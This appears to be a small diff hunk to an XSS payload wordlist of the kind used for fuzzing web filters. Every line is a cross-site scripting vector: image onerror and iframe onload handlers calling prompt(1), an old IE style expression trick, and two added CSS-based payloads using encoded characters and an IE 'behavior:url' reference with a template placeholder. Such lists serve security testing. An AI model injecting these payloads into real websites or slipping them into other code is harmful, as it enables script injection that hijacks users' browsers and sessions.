@@ -24,3 +24,5 @@
 "><img src=x onerror=prompt(1);>
 /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
 exp/*<XSS STYLE='no\xss:noxss("*//*");
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<x style="behavior:url(%(sct)s)">
